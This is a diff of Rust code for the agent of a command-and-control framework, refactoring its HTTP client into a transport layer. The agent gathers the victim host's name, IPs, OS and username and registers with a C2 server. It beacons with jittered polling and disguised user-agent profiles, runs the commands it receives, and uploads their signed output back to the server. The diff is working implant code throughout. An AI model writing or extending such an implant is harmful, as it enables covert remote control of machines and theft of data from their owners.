@@ -13,12 +13,12 @@ use std::time::Duration;
 use anyhow::Context;
 use cloakcat_protocol::{profile_by_name, sign_result, Command, DerivedKeys, Endpoints, ResultReq};
 use rand::Rng;
-use reqwest::Client;
 use tokio::time::sleep;
 
 use crate::config::load_agent_config;
 use crate::exec::run_command;
 use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
+use crate::transport::{HttpTransport, Transport};
 
 fn rand_between(min_ms: u64, max_ms: u64) -> Duration {
     if min_ms >= max_ms {
@@ -36,8 +36,8 @@ fn advance_backoff(current: Option<u64>, max_ms: u64) -> u64 {
     }
 }
 
-async fn send_result(
-    client: &Client,
+async fn upload_result<T: Transport>(
+    transport: &T,
     result_url: &str,
     agent_id: &str,
     signing_key: &[u8],
@@ -55,14 +55,7 @@ async fn send_result(
         stderr: stderr.to_string(),
         signature,
     };
-
-    let res = client.post(result_url).header("X-Agent-Token", auth_token).json(&body).send().await?;
-    if !res.status().is_success() {
-        let status = res.status();
-        let text = res.text().await.unwrap_or_default();
-        anyhow::bail!("status={} body={}", status, text);
-    }
-    Ok(())
+    transport.send_result(result_url, auth_token, &body).await
 }
 
 fn load_or_create_agent_id() -> String {
@@ -92,22 +85,7 @@ pub async fn run() -> anyhow::Result<()> {
     let cfg = load_agent_config().context("config load failed")?;
 
     let profile = profile_by_name(&cfg.profile_name);
-
-    let mut builder = Client::builder();
-    if let Some(ua) = profile.user_agent() {
-        let mut headers = reqwest::header::HeaderMap::new();
-        headers.insert(
-            reqwest::header::USER_AGENT,
-            reqwest::header::HeaderValue::from_str(ua)
-                .expect("profile user_agent must be valid header value"),
-        );
-        builder = builder.default_headers(headers);
-    }
-    if cfg.c2_url.starts_with("https://") {
-        let accept_invalid = env::var("AGENT_ACCEPT_INVALID_CERTS").as_deref() == Ok("1");
-        builder = builder.danger_accept_invalid_certs(accept_invalid);
-    }
-    let client = builder.build()?;
+    let transport = HttpTransport::new(&*profile, &cfg.c2_url)?;
 
     let agent_id = load_or_create_agent_id();
 
@@ -137,13 +115,9 @@ pub async fn run() -> anyhow::Result<()> {
 
     // SECURITY: auth_token is sent in plaintext over HTTP.
     // Set c2_url to https:// and configure TLS on the server for production use.
-    let resp = client
-        .post(&endpoints.register)
-        .header("X-Agent-Token", &auth_token)
-        .json(&reg)
-        .send()
+    let reg_json = transport
+        .register(&endpoints.register, &auth_token, &reg)
         .await?;
-    let reg_json: cloakcat_protocol::RegisterResp = resp.json().await?;
     debug_log!("Registered: {:?}", reg_json);
 
     let beacon_min = env::var("AGENT_BEACON_MIN_MS")
@@ -163,7 +137,7 @@ pub async fn run() -> anyhow::Result<()> {
     loop {
         let url = format!("{}?hold=45", endpoints.poll);
 
-        let res = match client.get(&url).header("X-Agent-Token", &auth_token).send().await {
+        let (status, text) = match transport.poll(&url, &auth_token).await {
             Ok(r) => r,
             Err(e) => {
                 debug_log!("[agent] poll send error: {e} -> backoff");
@@ -174,30 +148,20 @@ pub async fn run() -> anyhow::Result<()> {
             }
         };
 
-        if res.status().as_u16() == 204 {
+        if status == 204 {
             debug_log!("[agent] poll: 204 no content -> sleep jitter");
             backoff_ms = None;
             sleep(rand_between(beacon_min, beacon_max)).await;
             continue;
         }
-        if !res.status().is_success() {
-            debug_log!("[agent] poll error: {} -> sleep jitter", res.status());
+        if !(200..300).contains(&status) {
+            debug_log!("[agent] poll error: {} -> sleep jitter", status);
             let next = advance_backoff(backoff_ms, backoff_max);
             backoff_ms = Some(next);
             sleep(rand_between(next / 2, next)).await;
             continue;
         }
 
-        let text = match res.text().await {
-            Ok(t) => t,
-            Err(e) => {
-                debug_log!("[agent] poll read error: {e} -> backoff");
-                let next = advance_backoff(backoff_ms, backoff_max);
-                backoff_ms = Some(next);
-                sleep(rand_between(next / 2, next)).await;
-                continue;
-            }
-        };
         let trimmed = text.trim();
         if trimmed == "{}" || trimmed.is_empty() {
             backoff_ms = None;
@@ -223,8 +187,8 @@ pub async fn run() -> anyhow::Result<()> {
                 let exit_code = -1;
                 let stdout = String::new();
                 let stderr = format!("exec error: {e}");
-                if let Err(e) = send_result(
-                    &client,
+                if let Err(e) = upload_result(
+                    &transport,
                     &endpoints.result,
                     &agent_id,
                     &keys.signing_key,
@@ -251,8 +215,8 @@ pub async fn run() -> anyhow::Result<()> {
             stderr.len()
         );
 
-        if let Err(e) = send_result(
-            &client,
+        if let Err(e) = upload_result(
+            &transport,
             &endpoints.result,
             &agent_id,
             &keys.signing_key,
